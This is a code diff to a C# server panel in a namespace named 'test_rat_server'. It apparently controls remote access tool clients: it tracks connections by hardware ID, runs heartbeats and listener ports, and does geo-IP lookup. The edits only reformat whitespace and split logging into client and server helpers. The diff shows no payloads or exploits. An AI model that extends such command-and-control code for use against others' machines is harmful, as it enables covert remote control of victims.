@@ -122,7 +122,7 @@ namespace test_rat_server
         {
             int currentIdCount = currentCount++;
             Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, HandleServiceStop);
-            if (client == null) 
+            if (client == null)
             {
                 try
                 {
@@ -143,55 +143,63 @@ namespace test_rat_server
                     clients[currentIdCount] = client;
                     clientdata = await GetAddInfo(client);
                 }
-                catch 
+                catch
                 {
                     clientdata = null;
                 }
-                if (clientdata == null) 
+                if (clientdata == null)
                 {
                     client.Disconnect();
                     return;
                 }
-                
+
                 List<ListViewItem> possibleDuplicates = GetClientsByHwid(clientdata.Text);
                 List<string[]> duplicates = new List<string[]>();
-                foreach (ListViewItem i in possibleDuplicates) 
+                foreach (ListViewItem i in possibleDuplicates)
                 {
                     string[] match = new string[] { i.SubItems[2].Text, i.SubItems[7].Text };
                     duplicates.Add(match);
                 }
 
-                if (duplicates.Count > 0 && duplicates.Contains(new string[] { clientdata.SubItems[2].Text, clientdata.SubItems[7].Text })) 
+                if (duplicates.Count > 0 && duplicates.Contains(new string[] { clientdata.SubItems[2].Text, clientdata.SubItems[7].Text }))
                 {
                     client.Disconnect();
                     return;
                 }
 
-                listView2.Invoke((MethodInvoker)(() =>//add the clientdata to the listview
+                listView2.Invoke((MethodInvoker)(() => // add the clientdata to the listview
                 {
                     clientdata = listView2.Items.Add(clientdata);
                 }));
 
-                Node HeartSock=await client.CreateSubNodeAsync(1);//create HeartBeat Node
-                if (HeartSock == null) 
+                Node HeartSock = await client.CreateSubNodeAsync(1);
+                if (HeartSock == null)
                 {
                     client.Disconnect();
                     return;
                 }
+
                 try
                 {
                     ListViewUpdater(clientdata, client);
                 }
                 catch { }
-                AddLog("new Client connected!", Color.Green);
+
+                int clientId = client.ID;
+
+                // Log the new connection
+                AddLogClient($"New Client connected! ID: {clientId}", Color.Green);
+
                 await HeartBeat(HeartSock, client);
             }
-            else 
+            else
             {
                 client.Parent = clients[client.ID];
                 await clients[client.ID].AddSubNode(client);
             }
         }
+
+
 
         private List<ListViewItem> GetClientsByHwid(string hwid)
         {
@@ -433,7 +441,7 @@ namespace test_rat_server
                         if (i.Tag == client) 
                         {
                             i.Remove();
-                            AddLog("Client disconnected!", Color.Red);
+                            AddLogClient("Client disconnected!", Color.Red);
                         }
                     }
                 }));
@@ -510,7 +518,7 @@ namespace test_rat_server
                         string error_msg=Encoding.UTF8.GetString(data, 1, data.Length - 1);
                         if (LogErrors) 
                         {
-                            AddLog("Application error has occurred: " + error_msg, Color.Red);
+                            AddLogServer("Application error has occurred: " + error_msg, Color.Red);
                         }
                     } catch { }
                     break;
@@ -550,7 +558,7 @@ namespace test_rat_server
             listView2.SmallImageList = list;
             ip2countryDatabase = new DatabaseReader(Path.Combine("country_flags", "GeoLite2-Country.mmdb"));
 
-            AddLog("Started!", Color.Green);
+            AddLogServer("Started!", Color.Green);
         }
 
         private string SerializeControlsToJson()
@@ -639,7 +647,7 @@ namespace test_rat_server
                     string[] row = { string_port };
                     var listViewItem = new ListViewItem(row);
                     listView1.Items.Add(listViewItem);
-                    AddLog($"Listener on port {string_port} started!", Color.Green);
+                    AddLogServer($"Listener on port {string_port} started!", Color.Green);
                     new Thread(() => ListeningHandler.CreateListener(i)).Start();
                 }
 
@@ -692,7 +700,7 @@ namespace test_rat_server
             string[] row = { string_port };
             var listViewItem = new ListViewItem(row);
             listView1.Items.Add(listViewItem);
-            AddLog($"Listener on port {string_port} started!", Color.Green);
+            AddLogServer($"Listener on port {string_port} started!", Color.Green);
             new Thread(()=> ListeningHandler.CreateListener(port)).Start();
         }
 
@@ -700,7 +708,7 @@ namespace test_rat_server
         {
             int port = Int32.Parse(portItem.SubItems[0].Text);
             ListeningHandler.StopListener(port);
-            AddLog($"Listener on port {port} stopped!", Color.Green);
+            AddLogServer($"Listener on port {port} stopped!", Color.Green);
             portItem.Remove();
         }
 
@@ -734,7 +742,7 @@ namespace test_rat_server
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
-        private void AddLog(string message, Color textcolor) 
+        private void AddLog(string message, Color textcolor)
         {
             ListViewItem lvi = new ListViewItem();
             lvi.Text = DateTime.Now.ToString("hh:mm:ss tt");
@@ -742,7 +750,18 @@ namespace test_rat_server
             lvi.ForeColor = textcolor;
             listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
         }
-        
+
+        private void AddLogClient(string message, Color textcolor)
+        {
+            AddLog($"[Client] {message}", textcolor);
+        }
+
+        private void AddLogServer(string message, Color textcolor)
+        {
+            AddLog($"[Serveur] {message}", textcolor);
+        }
+
+
         private async Task StartChat(Node client)
         {
             try
@@ -1848,6 +1867,11 @@ namespace test_rat_server
         }
 
         private void label20_Click_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label20_Click_2(object sender, EventArgs e)
         {
 
         }
